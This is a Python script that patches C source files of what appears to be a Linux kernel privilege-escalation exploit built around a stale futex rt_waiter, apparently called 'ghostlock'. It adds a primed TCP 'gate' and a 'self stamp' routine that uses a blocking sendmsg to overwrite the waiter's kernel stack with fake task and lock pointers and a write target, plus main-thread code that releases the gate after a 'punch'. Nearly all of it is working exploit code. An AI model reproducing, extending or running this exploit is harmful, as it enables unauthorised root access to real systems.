#!/usr/bin/env python3
"""STAGE74/75/76 rebuild (idempotent, safe after /tmp rollback)."""
import io
import os
import sys

ROOT = '/tmp/gw/src/core'


def load(n):
    return io.open(os.path.join(ROOT, n), encoding='utf-8').read()


def save(n, t):
    io.open(os.path.join(ROOT, n), 'w', encoding='utf-8').write(t)
    print('  wrote', n)


def patch_common_h():
    s = load('common.h')
    if 'sm_self_stamp' in s:
        print('common.h already')
        return
    old = 'void do_sendmsg_fake_lock_route(void);'
    new = ('void do_sendmsg_fake_lock_route(void);\n'
           'int sm_gate_prepare(void);\n'
           'void sm_self_stamp(void);\n'
           'void sm_gate_release(void);')
    if old not in s:
        print('common.h ANCHOR MISSING'); sys.exit(1)
    save('common.h', s.replace(old, new, 1))


def patch_sendmsg_route():
    s = load('sendmsg_route.c')
    if 'sm_self_stamp' in s:
        print('sendmsg_route.c already')
        return

    old_gate = 'static int sm_tcp_gate(int *out_snd, int *out_peer) {'
    new_gate = (
        '/* STAGE74: gate built ONCE before the waiter exists; every syscall here\n'
        ' * would otherwise clobber the waiter kernel stack we are stamping. */\n'
        'static int sm_snd_fd = -1, sm_peer_fd = -1;\n'
        'static int sm_gate_primed = 0;\n'
        'int sm_gate_prepare(void) {')
    if old_gate not in s:
        print('gate anchor missing'); sys.exit(1)
    s = s.replace(old_gate, new_gate, 1)

    old_tail = ('  struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };\n'
                '  setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));\n'
                '  *out_snd = s;\n'
                '  *out_peer = c;\n'
                '  return 1;\n'
                '}')
    new_tail = (
        '  /* Prime the send path so the later sendmsg blocks in TCP. */\n'
        '  uint32_t outq = 0;\n'
        '  int prime_ok = 0;\n'
        '  if (r1 == 0 && r2 == 0) {\n'
        '    int fl = fcntl(s, F_GETFL, 0);\n'
        '    if (fl >= 0) fcntl(s, F_SETFL, fl | O_NONBLOCK);\n'
        '    static char fill[65536];\n'
        '    memset(fill, 0x5a, sizeof(fill));\n'
        '    for (int i = 0; i < 4096; i++) {\n'
        '      ssize_t n = send(s, fill, sizeof(fill), MSG_NOSIGNAL);\n'
        '      if (n < 0) {\n'
        '        if (errno == EAGAIN || errno == EWOULDBLOCK) { prime_ok = 1; break; }\n'
        '        break;\n'
        '      }\n'
        '    }\n'
        '    if (fl >= 0) fcntl(s, F_SETFL, fl);\n'
        '    socklen_t ol = sizeof(outq);\n'
        '    if (ioctl(s, TIOCOUTQ, &outq) != 0) outq = 0;\n'
        '  }\n'
        '  pr_info("sendmsg gate prime_ok=%d outq=%u sndbuf=%u\\n",\n'
        '          prime_ok, outq, sbv);\n'
        '  sm_snd_fd = s;\n'
        '  sm_peer_fd = c;\n'
        '  sm_gate_primed = prime_ok;\n'
        '  return 1;\n'
        '}')
    if old_tail not in s:
        print('gate tail anchor missing'); sys.exit(2)
    s = s.replace(old_tail, new_tail, 1)

    old1 = ('  int snd = -1, peer = -1;\n'
            '  if (!sm_tcp_gate(&snd, &peer)) {\n'
            '    pr_error("sendmsg: tcp gate failed errno=%d\\n", errno);\n'
            '    return;\n'
            '  }')
    new1 = ('  int snd = sm_snd_fd, peer = sm_peer_fd;\n'
            '  if (snd < 0) {\n'
            '    pr_error("sendmsg: gate not prepared\\n");\n'
            '    return;\n'
            '  }')
    if old1 not in s:
        print('old1 anchor missing'); sys.exit(3)
    s = s.replace(old1, new1, 1)

    anchor2 = 'void do_sendmsg_fake_lock_route(void) {'
    extra = '''/* STAGE74: waiter-thread self stamp. Exactly ONE syscall (sendmsg) so the
 * carrier bytes land on this thread's own stale rt_waiter frame. */
void sm_self_stamp(void) {
  if (sm_snd_fd < 0) { ckpt_val("self_stamp_nogate", 1); return; }
  if (!sm_gate_primed) ckpt_val("self_stamp_unprimed", 1);
  static unsigned char payload[0x200000];
  memset(payload, 0x41, sizeof(payload));
  unsigned char name[SM_NAME_LEN];
  memset(name, 0, sizeof(name));
  uint64_t task_val = (uint64_t)fake_task;
  uint64_t lock_val = (uint64_t)fake_lock;
  uint64_t wake_prio = (uint64_t)SM_WAKE_STATE |
                       ((uint64_t)SM_WAITER_PRIO << 32);
  int smp = env_int_range("SM_PROBE", 0, 0, 6);
  uintptr_t target = pselect_write_target();
  if (env_flag("SM_NOWRITE", 0)) target = 0;
  if (smp == 1) target = 0xdeadbeefdeadbeefULL;
  if (smp == 2) task_val = 0xdeadbeefdeadbeefULL;
  if (smp == 3) lock_val = 0xdeadbeefdeadbeefULL;
  if (smp == 4) lock_val = 0;
  if (smp == 5) { lock_val = 0; task_val = 0; }
  put64(name, 0x00, (uint64_t)target);
  put64(name, 0x08, task_val);
  put64(name, 0x10, lock_val);
  put64(name, 0x18, wake_prio);
  put64(name, 0x20, 0);
  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  iov[0].iov_base = payload;
  iov[0].iov_len = 0x200000;
  for (int i = 1; i <= 7; i++) { iov[i].iov_base = NULL; iov[i].iov_len = 0; }
  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_name = name;
  mh.msg_namelen = SM_NAME_LEN;
  mh.msg_iov = iov;
  mh.msg_iovlen = 8;
  /* SELFARM: atomic_store is not a syscall -> stack stays clean. */
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec,
               env_int_range("SM_DELAY_US", 150000, 0, 5000000));
  atomic_store(&punch_consume_go, 1);
  int r = (int)sendmsg(sm_snd_fd, &mh, MSG_NOSIGNAL);
  int e = errno;
  ckpt_val("self_stamp_ret", (long)r);
  ckpt_val("self_stamp_errno", (long)e);
}

/* Unblock the waiter's blocked sendmsg (main thread, after the punch). */
void sm_gate_release(void) {
  if (sm_peer_fd < 0) return;
  char b[1];
  ssize_t n = read(sm_peer_fd, b, 1);
  ckpt_val("gate_release_read", (long)n);
  ckpt_val("gate_release_errno", (long)errno);
}

'''
    if anchor2 not in s:
        print('anchor2 missing'); sys.exit(4)
    s = s.replace(anchor2, extra + anchor2, 1)
    save('sendmsg_route.c', s)


def patch_main():
    s = load('main.c')
    changed = False

    if 'sm_self_stamp();' not in s:
        anchor = '  int futex_errno = errno;\n'
        inject = (
            '  /* STAGE74: only the waiter itself can overwrite the stale rt_waiter\n'
            '   * on its own kernel stack. No ckpt/syscall before sendmsg. */\n'
            '  if (sendmsg_route_selected() && !env_flag("GHOSTLOCK_OBSERVE", 0) &&\n'
            '      env_flag("SM_SELF", 1)) {\n'
            '    sm_self_stamp();\n'
            '    ckpt_val("wait_self_futex_ret", futex_ret);\n'
            '    ckpt_val("wait_self_futex_errno", (long)futex_errno);\n'
            '  }\n')
        idx = s.find(anchor)
        if idx < 0:
            print('main anchor a missing'); sys.exit(5)
        pos = idx + len(anchor)
        s = s[:pos] + inject + s[pos:]
        changed = True

    old2 = ('  if (sendmsg_route_selected()) {\n'
            '    do_sendmsg_fake_lock_route();\n'
            '  } else if (mcast_route_selected()) {')
    new2 = ('  if (sendmsg_route_selected()) {\n'
            '    /* done right after the futex returned (by the waiter itself) */\n'
            '  } else if (mcast_route_selected()) {')
    if old2 in s:
        s = s.replace(old2, new2, 1)
        changed = True

    if 'stage74_gate' not in s:
        old3 = '  ckpt_begin("w_route");\n  run_main_route_threads();'
        new3 = ('  /* stage74_gate: build the primed TCP gate BEFORE any waiter thread\n'
                '   * exists, so the waiter needs only one blocking sendmsg later. */\n'
                '  if (sendmsg_route_selected()) {\n'
                '    ckpt_begin("w_gate_prepare");\n'
                '    int g = sm_gate_prepare();\n'
                '    ckpt_val("sm_gate_ready", (long)g);\n'
                '    ckpt_end("w_gate_prepare");\n'
                '  }\n'
                '  ckpt_begin("w_route");\n'
                '  run_main_route_threads();')
        if old3 not in s:
            print('main anchor c missing'); sys.exit(6)
        s = s.replace(old3, new3, 1)
        changed = True

    if 'main_gate_release' not in s:
        old4 = '  while (!atomic_load(&route_done)) usleep(5000);\n}'
        new4 = (
            '  /* STAGE76: waiter is blocked inside sendmsg (own stack stamped).\n'
            '   * Wait for the consumer punch, then unblock it. */\n'
            '  if (sendmsg_route_selected() && env_flag("SM_SELF", 1) &&\n'
            '      !env_flag("GHOSTLOCK_OBSERVE", 0)) {\n'
            '    ckpt_begin("main_wait_punch");\n'
            '    for (int i = 0; i < 4000; i++) {\n'
            '      if (atomic_load(&consumer_calls) > 0) break;\n'
            '      usleep(1000);\n'
            '    }\n'
            '    ckpt_val("main_punch_calls", (long)atomic_load(&consumer_calls));\n'
            '    ckpt_end("main_wait_punch");\n'
            '    usleep(20000);\n'
            '    ckpt_begin("main_gate_release");\n'
            '    sm_gate_release();\n'
            '    ckpt_end("main_gate_release");\n'
            '  }\n'
            '  while (!atomic_load(&route_done)) usleep(5000);\n}')
        if old4 not in s:
            print('main anchor d missing'); sys.exit(7)
        s = s.replace(old4, new4, 1)
        changed = True

    if changed:
        save('main.c', s)
    else:
        print('main.c already')


print('== STAGE74/75/76 rebuild ==')
patch_common_h()
patch_sendmsg_route()
patch_main()
print('== done ==')